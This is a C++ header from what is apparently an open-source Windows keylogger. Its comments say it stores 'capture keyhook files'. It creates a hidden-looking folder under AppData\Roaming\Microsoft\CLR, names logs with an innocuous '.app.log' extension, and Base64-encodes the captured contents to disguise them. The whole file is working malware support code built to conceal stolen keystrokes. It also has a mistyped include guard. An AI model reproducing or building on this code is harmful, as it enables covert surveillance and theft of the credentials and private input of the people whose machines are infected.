/*
 *  C++ lib\io.h
 *  Lucas Barbosa | 2017 | Open source software
 */

#ifndef IO_H_INCLUDED
#define TO_H_INCLUDED

/*
 *  Input/Output header handles all file operations and director
 *  managements for debug log files and capture keyhook files.
 *  Locations where these files are stored are specified on the
 *  readme.txt.
 */

#include <windows.h>
#include <cstdlib>
#include <fstream>
#include "Base64.h"

using namespace std;

namespace IO
{
// <C:\Users\USERNAME\AppData\Roaming>
std::string get_our_path(const bool append_seperator = false)
{
  /*
   *  getenv(), is used to get the environment. AppData is an environment variable
   *  in which we need (it contain access to the path of the current user's folder).
   */
  std::string appdata_dir(getenv("APPDATA"));
  std::string full_path = appdata_dir + "\\Microsoft\\CLR";
  return full_path + (append_seperator ? "\\" : "");
  // Complete Path: C:\Users\<USERNAME>\.AppData\Roaming\Microsoft\CLR
}

bool mkdir(std::string path)
{
  /*
   *  CreateDirectory(<path_to_directory>, <ip_security>)
   *  <path_to_directory>
   *  The path must be in windows format (backslashes \);
   *  <ip_security>
   *  When security is set to NULL default security preferences are enabled
   *
   *  For more on the windows API: https://msdn.microsoft.com/en-us/library/windows/desktop/aa363855(v=vs.85).aspx
   */
  return (bool)CreateDirectory(path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
}

// if for some reason the above function is not able to output a funcitonal path
bool mk_back_up_dir(std::string path)
{
  for (char &char_ : path)
  {
    if (char_ == '\\')
    {
      char_ = '\0';
      if (! mkdir(path))
      {
        return false;
      }
      char_ = '\\';
    }
  }
  return true;
}

template <typename T>
std::string write_log(const T &log_contents)
{
  // C:\Users\<USERNAME>\AppData\Roaming\Microsoft\CLR\ //
  std::string system_path = IO::get_our_path(true);
  Helper::DateTime curr_date_time;
  // name the log files with the current date and time in which they are made
  std::string log_file_name = curr_date_time.get_date_time_string("_") + ".app.log";

  try
  {
    std::ofstream log_file(system_path + log_file_name);
    if (! log_file)
    {
      return "";
    }
    // log file formatting
    std::ostringstream streamed_file_contents;
    streamed_file_contents << "[" << curr_date_time.get_date_time_string() << "]" <<
    std::endl << log_contents << std::endl;
    // actually encrypt the data being formatted into the log file
    std::string file_data = Base64::base64_encrypt(streamed_file_contents.str());
    log_file << file_data;
    if (! log_file)
    {
      return "";
    }
    log_file.close();
    return log_file_name;
  } catch (...)
  {
    return "";
  }
}

}// end of namespace IO

#endif // IO_H_INCLUDED
